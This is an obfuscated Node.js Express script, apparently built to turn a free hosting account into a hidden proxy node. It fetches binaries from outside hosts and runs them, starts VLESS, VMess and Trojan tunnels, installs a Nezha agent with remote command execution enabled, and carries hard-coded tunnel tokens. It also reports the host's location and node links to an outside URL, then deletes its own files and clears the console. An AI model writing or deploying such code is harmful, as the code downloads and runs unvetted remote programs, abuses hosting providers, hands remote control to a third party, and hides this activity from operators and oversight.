const _0x23226a=_0x2e57;(function(_0x590376,_0x48fb38){const _0x20451e=_0x2e57,_0x30ea51=_0x590376();while(!![]){try{const _0x2cfe5e=parseInt(_0x20451e(0x1ab))/0x1*(-parseInt(_0x20451e(0x1a1))/0x2)+-parseInt(_0x20451e(0x15d))/0x3*(-parseInt(_0x20451e(0x1fb))/0x4)+parseInt(_0x20451e(0x135))/0x5+-parseInt(_0x20451e(0x1dd))/0x6+parseInt(_0x20451e(0x1a6))/0x7+-parseInt(_0x20451e(0x1d9))/0x8*(parseInt(_0x20451e(0x191))/0x9)+-parseInt(_0x20451e(0x164))/0xa*(-parseInt(_0x20451e(0x1b8))/0xb);if(_0x2cfe5e===_0x48fb38)break;else _0x30ea51['push'](_0x30ea51['shift']());}catch(_0x4999e6){_0x30ea51['push'](_0x30ea51['shift']());}}}(_0x42f7,0x5e632));const express=require('express'),app=express(),axios=require(_0x23226a(0x185)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x23226a(0x19e)),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x23226a(0x1ce)),UPLOAD_URL=process[_0x23226a(0x189)][_0x23226a(0x174)]||'',PROJECT_URL=process[_0x23226a(0x189)][_0x23226a(0x1da)]||'',AUTO_ACCESS=process['env'][_0x23226a(0x1bd)]||![],FILE_PATH=process[_0x23226a(0x189)]['FILE_PATH']||'./tmp',SUB_PATH=process['env']['SUB_PATH']||_0x23226a(0x1c6),PORT=process[_0x23226a(0x189)][_0x23226a(0x1a8)]||process[_0x23226a(0x189)][_0x23226a(0x1be)]||0xbb8,UUID=process[_0x23226a(0x189)][_0x23226a(0x1f6)]||_0x23226a(0x198),NEZHA_SERVER=process['env'][_0x23226a(0x1b7)]||'',NEZHA_PORT=process['env'][_0x23226a(0x165)]||'',NEZHA_KEY=process[_0x23226a(0x189)][_0x23226a(0x1ee)]||'',ARGO_DOMAIN=process[_0x23226a(0x189)][_0x23226a(0x1de)]||_0x23226a(0x152),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x23226a(0x1b6),ARGO_PORT=process[_0x23226a(0x189)]['ARGO_PORT']||0xcb20,CFIP=process[_0x23226a(0x189)][_0x23226a(0x1b9)]||_0x23226a(0x186),CFPORT=process[_0x23226a(0x189)]['CFPORT']||0x1bb,NAME=process['env'][_0x23226a(0x15a)]||'';!fs[_0x23226a(0x1db)](FILE_PATH)?(fs[_0x23226a(0x1a3)](FILE_PATH),console[_0x23226a(0x178)](FILE_PATH+_0x23226a(0x17d))):console[_0x23226a(0x178)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x3bc303=_0x23226a,_0x3ea13a='abcdefghijklmnopqrstuvwxyz';let _0x14d5ac='';for(let _0x356d2a=0x0;_0x356d2a<0x6;_0x356d2a++){_0x14d5ac+=_0x3ea13a[_0x3bc303(0x1c4)](Math['floor'](Math[_0x3bc303(0x162)]()*_0x3ea13a[_0x3bc303(0x1e2)]));}return _0x14d5ac;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x23226a(0x170)](FILE_PATH,npmName),phpPath=path[_0x23226a(0x170)](FILE_PATH,phpName),webPath=path[_0x23226a(0x170)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x23226a(0x1d2)),listPath=path[_0x23226a(0x170)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x23226a(0x1cb)),configPath=path[_0x23226a(0x170)](FILE_PATH,'config.json');function deleteNodes(){const _0x3ca3eb=_0x23226a;try{if(!UPLOAD_URL)return;if(!fs[_0x3ca3eb(0x1db)](subPath))return;let _0x1462df;try{_0x1462df=fs[_0x3ca3eb(0x18e)](subPath,_0x3ca3eb(0x1b3));}catch{return null;}const _0x5d91cb=Buffer['from'](_0x1462df,'base64')[_0x3ca3eb(0x1c9)](_0x3ca3eb(0x1b3)),_0x18b5b9=_0x5d91cb[_0x3ca3eb(0x199)]('\x0a')['filter'](_0x15a3ad=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x15a3ad));if(_0x18b5b9[_0x3ca3eb(0x1e2)]===0x0)return;return axios[_0x3ca3eb(0x136)](UPLOAD_URL+_0x3ca3eb(0x1e4),JSON[_0x3ca3eb(0x158)]({'nodes':_0x18b5b9}),{'headers':{'Content-Type':'application/json'}})[_0x3ca3eb(0x16a)](_0x291c45=>{return null;}),null;}catch(_0x52653d){return null;}}function cleanupOldFiles(){const _0x836580=_0x23226a;try{const _0x308383=fs[_0x836580(0x17f)](FILE_PATH);_0x308383[_0x836580(0x182)](_0x5d03f9=>{const _0x9f118b=_0x836580,_0x3d2603=path[_0x9f118b(0x170)](FILE_PATH,_0x5d03f9);try{const _0x3d3bd2=fs[_0x9f118b(0x176)](_0x3d2603);_0x3d3bd2[_0x9f118b(0x167)]()&&fs[_0x9f118b(0x193)](_0x3d2603);}catch(_0x286b21){}});}catch(_0xed8e13){}}function _0x2e57(_0x2c7752,_0xe930d4){const _0x42f7a3=_0x42f7();return _0x2e57=function(_0x2e570,_0x362f61){_0x2e570=_0x2e570-0x133;let _0x443b33=_0x42f7a3[_0x2e570];return _0x443b33;},_0x2e57(_0x2c7752,_0xe930d4);}app['get']('/',function(_0x19c206,_0x272881){const _0x1ef1f6=_0x23226a;_0x272881[_0x1ef1f6(0x173)](_0x1ef1f6(0x181));});async function generateConfig(){const _0x971d78=_0x23226a,_0x2c7621={'log':{'access':_0x971d78(0x1ca),'error':_0x971d78(0x1ca),'loglevel':_0x971d78(0x1ae)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x971d78(0x160),'settings':{'clients':[{'id':UUID,'flow':_0x971d78(0x15e)}],'decryption':_0x971d78(0x1ae),'fallbacks':[{'dest':0xbb9},{'path':_0x971d78(0x1d4),'dest':0xbba},{'path':_0x971d78(0x143),'dest':0xbbb},{'path':_0x971d78(0x137),'dest':0xbbc}]},'streamSettings':{'network':_0x971d78(0x140)}},{'port':0xbb9,'listen':_0x971d78(0x1d3),'protocol':_0x971d78(0x160),'settings':{'clients':[{'id':UUID}],'decryption':_0x971d78(0x1ae)},'streamSettings':{'network':_0x971d78(0x140),'security':_0x971d78(0x1ae)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x971d78(0x160),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x971d78(0x1ae)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x971d78(0x1d4)}},'sniffing':{'enabled':!![],'destOverride':[_0x971d78(0x171),_0x971d78(0x154),_0x971d78(0x197)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x971d78(0x1d3),'protocol':_0x971d78(0x1a5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x971d78(0x143)}},'sniffing':{'enabled':!![],'destOverride':[_0x971d78(0x171),'tls',_0x971d78(0x197)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x971d78(0x1e9),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x971d78(0x1ae),'wsSettings':{'path':_0x971d78(0x137)}},'sniffing':{'enabled':!![],'destOverride':[_0x971d78(0x171),'tls',_0x971d78(0x197)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':_0x971d78(0x1ed)},{'protocol':'blackhole','tag':'block'}]};fs[_0x971d78(0x13d)](path[_0x971d78(0x170)](FILE_PATH,_0x971d78(0x1e8)),JSON['stringify'](_0x2c7621,null,0x2));}function getSystemArchitecture(){const _0x478dc9=_0x23226a,_0x4103c8=os[_0x478dc9(0x1bf)]();return _0x4103c8==='arm'||_0x4103c8===_0x478dc9(0x14f)||_0x4103c8===_0x478dc9(0x1ef)?_0x478dc9(0x1fd):_0x478dc9(0x134);}function downloadFile(_0x274e70,_0x340b7f,_0x8bf205){const _0x4eabce=_0x23226a,_0x448de0=_0x274e70;!fs['existsSync'](FILE_PATH)&&fs[_0x4eabce(0x1a3)](FILE_PATH,{'recursive':!![]});const _0x4a6d97=fs[_0x4eabce(0x187)](_0x448de0);axios({'method':'get','url':_0x340b7f,'responseType':_0x4eabce(0x1ea)})['then'](_0x3744b5=>{const _0x4d807b=_0x4eabce;_0x3744b5['data'][_0x4d807b(0x172)](_0x4a6d97),_0x4a6d97['on']('finish',()=>{const _0x358a99=_0x4d807b;_0x4a6d97[_0x358a99(0x1c0)](),console[_0x358a99(0x178)](_0x358a99(0x1e3)+path[_0x358a99(0x194)](_0x448de0)+_0x358a99(0x16c)),_0x8bf205(null,_0x448de0);}),_0x4a6d97['on'](_0x4d807b(0x17e),_0x4dfbce=>{const _0x31689b=_0x4d807b;fs['unlink'](_0x448de0,()=>{});const _0x2f5a43=_0x31689b(0x1e3)+path['basename'](_0x448de0)+_0x31689b(0x1a7)+_0x4dfbce[_0x31689b(0x168)];console[_0x31689b(0x17e)](_0x2f5a43),_0x8bf205(_0x2f5a43);});})['catch'](_0x2540ee=>{const _0x254341=_0x4eabce,_0x184b19=_0x254341(0x1e3)+path['basename'](_0x448de0)+_0x254341(0x1a7)+_0x2540ee['message'];console['error'](_0x184b19),_0x8bf205(_0x184b19);});}async function downloadFilesAndRun(){const _0x36cc7f=_0x23226a,_0x1a67d3=getSystemArchitecture(),_0x4a0167=getFilesForArchitecture(_0x1a67d3);if(_0x4a0167[_0x36cc7f(0x1e2)]===0x0){console[_0x36cc7f(0x178)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x488f7e=_0x4a0167[_0x36cc7f(0x161)](_0x59c321=>{return new Promise((_0x5ecbf4,_0x5c5666)=>{const _0x4030c1=_0x2e57;downloadFile(_0x59c321[_0x4030c1(0x19b)],_0x59c321[_0x4030c1(0x1fc)],(_0xd0cee7,_0x27cbc1)=>{_0xd0cee7?_0x5c5666(_0xd0cee7):_0x5ecbf4(_0x27cbc1);});});});try{await Promise[_0x36cc7f(0x1e0)](_0x488f7e);}catch(_0x2ba2ac){console[_0x36cc7f(0x17e)](_0x36cc7f(0x147),_0x2ba2ac);return;}function _0x1f6cba(_0x90973b){const _0x4e346c=_0x36cc7f,_0x3bb2c9=0x1fd;_0x90973b[_0x4e346c(0x182)](_0x3e7299=>{const _0x120cd8=_0x4e346c;fs['existsSync'](_0x3e7299)&&fs[_0x120cd8(0x13a)](_0x3e7299,_0x3bb2c9,_0x2c7c2f=>{const _0x24e00b=_0x120cd8;_0x2c7c2f?console[_0x24e00b(0x17e)](_0x24e00b(0x1a9)+_0x3e7299+':\x20'+_0x2c7c2f):console[_0x24e00b(0x178)]('Empowerment\x20success\x20for\x20'+_0x3e7299+':\x20'+_0x3bb2c9[_0x24e00b(0x1c9)](0x8));});});}const _0x318dcc=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1f6cba(_0x318dcc);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1f8835=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x36cc7f(0x1f5)]():'',_0x534f02=new Set([_0x36cc7f(0x146),_0x36cc7f(0x1f2),_0x36cc7f(0x1b4),_0x36cc7f(0x148),_0x36cc7f(0x15b),_0x36cc7f(0x1a2)]),_0xc60a2a=_0x534f02[_0x36cc7f(0x16e)](_0x1f8835)?_0x36cc7f(0x14e):_0x36cc7f(0x141),_0x32d4d1=_0x36cc7f(0x1f4)+NEZHA_KEY+_0x36cc7f(0x1cf)+NEZHA_SERVER+_0x36cc7f(0x175)+_0xc60a2a+_0x36cc7f(0x1e7)+UUID;fs['writeFileSync'](path[_0x36cc7f(0x170)](FILE_PATH,_0x36cc7f(0x195)),_0x32d4d1);const _0x106c84=_0x36cc7f(0x18b)+phpPath+_0x36cc7f(0x14b)+FILE_PATH+_0x36cc7f(0x163);try{await exec(_0x106c84),console[_0x36cc7f(0x178)](phpName+_0x36cc7f(0x149)),await new Promise(_0x349311=>setTimeout(_0x349311,0x3e8));}catch(_0x430e7e){console[_0x36cc7f(0x17e)](_0x36cc7f(0x180)+_0x430e7e);}}else{let _0xa65bbb='';const _0x5342d3=[_0x36cc7f(0x146),_0x36cc7f(0x1f2),'2096','2087',_0x36cc7f(0x15b),_0x36cc7f(0x1a2)];_0x5342d3[_0x36cc7f(0x183)](NEZHA_PORT)&&(_0xa65bbb=_0x36cc7f(0x19c));const _0x245c6b='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xa65bbb+_0x36cc7f(0x17a);try{await exec(_0x245c6b),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x25bdcf=>setTimeout(_0x25bdcf,0x3e8));}catch(_0x37fbe9){console[_0x36cc7f(0x17e)](_0x36cc7f(0x156)+_0x37fbe9);}}}else console[_0x36cc7f(0x178)](_0x36cc7f(0x155));const _0x2a2920=_0x36cc7f(0x18b)+webPath+_0x36cc7f(0x1d8)+FILE_PATH+_0x36cc7f(0x1c3);try{await exec(_0x2a2920),console[_0x36cc7f(0x178)](webName+_0x36cc7f(0x149)),await new Promise(_0x540552=>setTimeout(_0x540552,0x3e8));}catch(_0x442393){console[_0x36cc7f(0x17e)](_0x36cc7f(0x17b)+_0x442393);}if(fs[_0x36cc7f(0x1db)](botPath)){let _0x309bce;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x309bce=_0x36cc7f(0x1a0)+ARGO_AUTH;else ARGO_AUTH[_0x36cc7f(0x14a)](/TunnelSecret/)?_0x309bce=_0x36cc7f(0x1ba)+FILE_PATH+_0x36cc7f(0x17c):_0x309bce=_0x36cc7f(0x1eb)+FILE_PATH+_0x36cc7f(0x14c)+ARGO_PORT;try{await exec(_0x36cc7f(0x18b)+botPath+'\x20'+_0x309bce+'\x20>/dev/null\x202>&1\x20&'),console[_0x36cc7f(0x178)](botName+_0x36cc7f(0x149)),await new Promise(_0x38b702=>setTimeout(_0x38b702,0x7d0));}catch(_0x435027){console[_0x36cc7f(0x17e)](_0x36cc7f(0x142)+_0x435027);}}await new Promise(_0x1e489a=>setTimeout(_0x1e489a,0x1388));}function getFilesForArchitecture(_0xb6d59d){const _0x54a713=_0x23226a;let _0x1e35ab;_0xb6d59d===_0x54a713(0x1fd)?_0x1e35ab=[{'fileName':webPath,'fileUrl':_0x54a713(0x1d6)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x1e35ab=[{'fileName':webPath,'fileUrl':_0x54a713(0x1f7)},{'fileName':botPath,'fileUrl':_0x54a713(0x1f0)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x35d0f4=_0xb6d59d===_0x54a713(0x1fd)?_0x54a713(0x14d):_0x54a713(0x144);_0x1e35ab[_0x54a713(0x1c7)]({'fileName':npmPath,'fileUrl':_0x35d0f4});}else{const _0x37f830=_0xb6d59d===_0x54a713(0x1fd)?'https://arm64.ssss.nyc.mn/v1':_0x54a713(0x1f3);_0x1e35ab[_0x54a713(0x1c7)]({'fileName':phpPath,'fileUrl':_0x37f830});}}return _0x1e35ab;}function argoType(){const _0x566914=_0x23226a;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x566914(0x178)](_0x566914(0x1e1));return;}if(ARGO_AUTH[_0x566914(0x183)](_0x566914(0x192))){fs[_0x566914(0x13d)](path[_0x566914(0x170)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x231d9f=_0x566914(0x13e)+ARGO_AUTH[_0x566914(0x199)]('\x22')[0xb]+_0x566914(0x1c5)+path[_0x566914(0x170)](FILE_PATH,_0x566914(0x1f8))+_0x566914(0x19a)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x566914(0x13f);fs[_0x566914(0x13d)](path[_0x566914(0x170)](FILE_PATH,'tunnel.yml'),_0x231d9f);}else console[_0x566914(0x178)](_0x566914(0x1b1));}async function extractDomains(){const _0x45bc0f=_0x23226a;let _0x23a789;if(ARGO_AUTH&&ARGO_DOMAIN)_0x23a789=ARGO_DOMAIN,console['log'](_0x45bc0f(0x153),_0x23a789),await _0x56661c(_0x23a789);else try{const _0x5314a2=fs['readFileSync'](path['join'](FILE_PATH,_0x45bc0f(0x1cb)),_0x45bc0f(0x1b3)),_0x3e033f=_0x5314a2[_0x45bc0f(0x199)]('\x0a'),_0x2fa10b=[];_0x3e033f[_0x45bc0f(0x182)](_0x331c96=>{const _0x107af9=_0x45bc0f,_0x47dc9b=_0x331c96['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x47dc9b){const _0x4dbd4e=_0x47dc9b[0x1];_0x2fa10b[_0x107af9(0x1c2)](_0x4dbd4e);}});if(_0x2fa10b[_0x45bc0f(0x1e2)]>0x0)_0x23a789=_0x2fa10b[0x0],console['log'](_0x45bc0f(0x1ec),_0x23a789),await _0x56661c(_0x23a789);else{console[_0x45bc0f(0x178)](_0x45bc0f(0x150)),fs[_0x45bc0f(0x193)](path['join'](FILE_PATH,_0x45bc0f(0x1cb)));async function _0x44892f(){const _0x307331=_0x45bc0f;try{process['platform']===_0x307331(0x1d0)?await exec(_0x307331(0x169)+botName+_0x307331(0x139)):await exec('pkill\x20-f\x20\x22['+botName[_0x307331(0x1c4)](0x0)+']'+botName[_0x307331(0x145)](0x1)+_0x307331(0x1e5));}catch(_0xcd998){}}_0x44892f(),await new Promise(_0x3f5d11=>setTimeout(_0x3f5d11,0xbb8));const _0x3acd0c='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x45bc0f(0x14c)+ARGO_PORT;try{await exec(_0x45bc0f(0x18b)+botPath+'\x20'+_0x3acd0c+'\x20>/dev/null\x202>&1\x20&'),console[_0x45bc0f(0x178)](botName+_0x45bc0f(0x149)),await new Promise(_0x18c758=>setTimeout(_0x18c758,0xbb8)),await extractDomains();}catch(_0x2ef4fa){console['error'](_0x45bc0f(0x142)+_0x2ef4fa);}}}catch(_0x4b8ba4){console[_0x45bc0f(0x17e)](_0x45bc0f(0x18c),_0x4b8ba4);}async function _0x1c2807(){const _0x550fb0=_0x45bc0f;try{const _0x4531f1=await axios[_0x550fb0(0x1ad)](_0x550fb0(0x15c),{'timeout':0xbb8});if(_0x4531f1[_0x550fb0(0x16b)]&&_0x4531f1['data'][_0x550fb0(0x196)]&&_0x4531f1[_0x550fb0(0x16b)][_0x550fb0(0x16d)])return _0x4531f1[_0x550fb0(0x16b)][_0x550fb0(0x196)]+'_'+_0x4531f1[_0x550fb0(0x16b)]['org'];}catch(_0x4027e9){try{const _0x4a1878=await axios[_0x550fb0(0x1ad)](_0x550fb0(0x1cd),{'timeout':0xbb8});if(_0x4a1878['data']&&_0x4a1878[_0x550fb0(0x16b)][_0x550fb0(0x19f)]===_0x550fb0(0x1d7)&&_0x4a1878['data'][_0x550fb0(0x151)]&&_0x4a1878[_0x550fb0(0x16b)][_0x550fb0(0x16d)])return _0x4a1878[_0x550fb0(0x16b)][_0x550fb0(0x151)]+'_'+_0x4a1878[_0x550fb0(0x16b)][_0x550fb0(0x16d)];}catch(_0x2f76e8){}}return'Unknown';}async function _0x56661c(_0xf6ff00){const _0x452cd5=await _0x1c2807(),_0x39dd84=NAME?NAME+'-'+_0x452cd5:_0x452cd5;return new Promise(_0x146ab7=>{setTimeout(()=>{const _0x483acf=_0x2e57,_0x467db9={'v':'2','ps':''+_0x39dd84,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x483acf(0x1ae),'net':'ws','type':'none','host':_0xf6ff00,'path':_0x483acf(0x1af),'tls':_0x483acf(0x154),'sni':_0xf6ff00,'alpn':'','fp':_0x483acf(0x16f)},_0x504b52=_0x483acf(0x1bc)+UUID+'@'+CFIP+':'+CFPORT+_0x483acf(0x18a)+_0xf6ff00+'&fp=firefox&type=ws&host='+_0xf6ff00+_0x483acf(0x18d)+_0x39dd84+_0x483acf(0x1fa)+Buffer[_0x483acf(0x1d1)](JSON[_0x483acf(0x158)](_0x467db9))[_0x483acf(0x1c9)](_0x483acf(0x19d))+_0x483acf(0x166)+UUID+'@'+CFIP+':'+CFPORT+_0x483acf(0x190)+_0xf6ff00+_0x483acf(0x1b5)+_0xf6ff00+_0x483acf(0x1aa)+_0x39dd84+_0x483acf(0x1a4);console['log'](Buffer[_0x483acf(0x1d1)](_0x504b52)[_0x483acf(0x1c9)]('base64')),fs['writeFileSync'](subPath,Buffer[_0x483acf(0x1d1)](_0x504b52)['toString'](_0x483acf(0x19d))),console[_0x483acf(0x178)](FILE_PATH+_0x483acf(0x133)),uploadNodes(),app[_0x483acf(0x1ad)]('/'+SUB_PATH,(_0x4a66e1,_0x3747c9)=>{const _0x27b45c=_0x483acf,_0x4793e3=Buffer[_0x27b45c(0x1d1)](_0x504b52)[_0x27b45c(0x1c9)](_0x27b45c(0x19d));_0x3747c9['set'](_0x27b45c(0x13b),_0x27b45c(0x13c)),_0x3747c9[_0x27b45c(0x173)](_0x4793e3);}),_0x146ab7(_0x504b52);},0x7d0);});}}async function uploadNodes(){const _0x5dbc92=_0x23226a;if(UPLOAD_URL&&PROJECT_URL){const _0x5ec5c4=PROJECT_URL+'/'+SUB_PATH,_0x2eeb77={'subscription':[_0x5ec5c4]};try{const _0x10ef0e=await axios[_0x5dbc92(0x136)](UPLOAD_URL+_0x5dbc92(0x1e6),_0x2eeb77,{'headers':{'Content-Type':_0x5dbc92(0x1dc)}});return _0x10ef0e&&_0x10ef0e[_0x5dbc92(0x19f)]===0xc8?(console[_0x5dbc92(0x178)](_0x5dbc92(0x1c1)),_0x10ef0e):null;}catch(_0x46cff6){if(_0x46cff6[_0x5dbc92(0x188)]){if(_0x46cff6['response'][_0x5dbc92(0x19f)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5dbc92(0x1db)](listPath))return;const _0x55fada=fs[_0x5dbc92(0x18e)](listPath,_0x5dbc92(0x1b3)),_0x1c5402=_0x55fada[_0x5dbc92(0x199)]('\x0a')[_0x5dbc92(0x15f)](_0x7fd089=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5dbc92(0x1b0)](_0x7fd089));if(_0x1c5402[_0x5dbc92(0x1e2)]===0x0)return;const _0x3c1db9=JSON['stringify']({'nodes':_0x1c5402});try{const _0x3d2b6f=await axios['post'](UPLOAD_URL+_0x5dbc92(0x138),_0x3c1db9,{'headers':{'Content-Type':_0x5dbc92(0x1dc)}});return _0x3d2b6f&&_0x3d2b6f[_0x5dbc92(0x19f)]===0xc8?(console[_0x5dbc92(0x178)](_0x5dbc92(0x1bb)),_0x3d2b6f):null;}catch(_0x158003){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x254994=_0x2e57,_0x543cd1=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x543cd1[_0x254994(0x1c2)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x543cd1[_0x254994(0x1c2)](phpPath);process['platform']===_0x254994(0x1d0)?exec(_0x254994(0x1f1)+_0x543cd1[_0x254994(0x170)]('\x20')+_0x254994(0x157),_0x821a3f=>{const _0x3c031e=_0x254994;console[_0x3c031e(0x1ac)](),console[_0x3c031e(0x178)](_0x3c031e(0x179)),console[_0x3c031e(0x178)](_0x3c031e(0x1df));}):exec(_0x254994(0x18f)+_0x543cd1[_0x254994(0x170)]('\x20')+_0x254994(0x1d5),_0x100531=>{const _0x52fe69=_0x254994;console['clear'](),console[_0x52fe69(0x178)](_0x52fe69(0x179)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x34d36e=_0x23226a;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x34d36e(0x178)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0xb78f7d=await axios['post'](_0x34d36e(0x1f9),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x34d36e(0x1dc)}});return console['log'](_0x34d36e(0x1cc)),_0xb78f7d;}catch(_0x3d72b1){return console[_0x34d36e(0x17e)](_0x34d36e(0x1c8)+_0x3d72b1[_0x34d36e(0x168)]),null;}}function _0x42f7(){const _0x4929d9=['npm\x20running\x20error:\x20','\x20>\x20nul\x202>&1','stringify','http\x20server\x20is\x20running\x20on\x20port:','NAME','2083','https://ipapi.co/json/','303QnUtfo','xtls-rprx-vision','filter','vless','map','random','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','406160ZyQxQW','NEZHA_PORT','\x0a\x0atrojan://','isFile','message','taskkill\x20/f\x20/im\x20','catch','data','\x20successfully','org','has','firefox','join','http','pipe','send','UPLOAD_URL','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','statSync','listen','log','App\x20is\x20running','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','web\x20running\x20error:\x20','/tunnel.yml\x20run','\x20is\x20created','error','readdirSync','php\x20running\x20error:\x20','Hello\x20world!','forEach','includes','Error\x20in\x20startserver:','axios','cdns.doon.eu.org','createWriteStream','response','env','?encryption=none&security=tls&sni=','nohup\x20','Error\x20reading\x20boot.log:','&path=%2Fvless-argo%3Fed%3D2560#','readFileSync','rm\x20-rf\x20','?security=tls&sni=','1233jHjgJU','TunnelSecret','unlinkSync','basename','config.yaml','country_code','quic','c59c6c3b-9b7c-4cba-bfe8-2fe579284e3f','split','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','fileName','--tls','base64','util','status','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','7972wrWSYe','2053','mkdirSync','\x0a\x20\x20\x20\x20','vmess','1602797EMVcSa','\x20failed:\x20','SERVER_PORT','Empowerment\x20failed\x20for\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','148mBCoue','clear','get','none','/vmess-argo?ed=2560','test','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Unhandled\x20error\x20in\x20startserver:','utf-8','2096','&fp=firefox&type=ws&host=','eyJhIjoiNTg5ZjIwZDZjMThiYTVlMDIzMDExMzUwMGM2MWM3MGUiLCJ0IjoiN2RiOGM0ODgtNmI5Ny00ZjRjLTg2YTgtY2I1NTFhY2Y1YmY1IiwicyI6IlpqUTROMkptTnpjdE1tUTFaaTAwTmpaaUxUZzFOV1V0WkdVMFpUY3laRFpoWVdWaiJ9','NEZHA_SERVER','231emjYBW','CFIP','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Nodes\x20uploaded\x20successfully','\x0avless://','AUTO_ACCESS','PORT','arch','close','Subscription\x20uploaded\x20successfully','push','/config.json\x20>/dev/null\x202>&1\x20&','charAt','\x0a\x20\x20credentials-file:\x20','sub','unshift','Add\x20automatic\x20access\x20task\x20faild:\x20','toString','/dev/null','boot.log','automatic\x20access\x20task\x20added\x20successfully','http://ip-api.com/json/','child_process','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','win32','from','sub.txt','127.0.0.1','/vless-argo','\x20>/dev/null\x202>&1','https://arm64.ssss.nyc.mn/web','success','\x20-c\x20','32032JPrmCt','PROJECT_URL','existsSync','application/json','585504aUBTar','ARGO_DOMAIN','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','all','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','length','Download\x20','/api/delete-nodes','\x22\x20>\x20/dev/null\x202>&1','/api/add-subscriptions','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','config.json','trojan','stream','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','ArgoDomain:','direct','NEZHA_KEY','aarch64','https://amd64.ssss.nyc.mn/bot','del\x20/f\x20/q\x20','8443','https://amd64.ssss.nyc.mn/v1','\x0aclient_secret:\x20','pop','UUID','https://amd64.ssss.nyc.mn/web','tunnel.json','https://oooo.serv00.net/add-url','\x0a\x0avmess://','13476BlCxuF','fileUrl','arm','/sub.txt\x20saved\x20successfully','amd','1002470BlkeEO','post','/trojan-argo','/api/add-nodes','.exe\x20>\x20nul\x202>&1','chmod','Content-Type','text/plain;\x20charset=utf-8','writeFileSync','\x0a\x20\x20tunnel:\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','tcp','false','Error\x20executing\x20command:\x20','/vmess-argo','https://amd64.ssss.nyc.mn/agent','substring','443','Error\x20downloading\x20files:','2087','\x20is\x20running','match','\x20-c\x20\x22','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https://arm64.ssss.nyc.mn/agent','true','arm64','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','countryCode','yyc.zxl1687926083.dpdns.org','ARGO_DOMAIN:','tls','NEZHA\x20variable\x20is\x20empty,skip\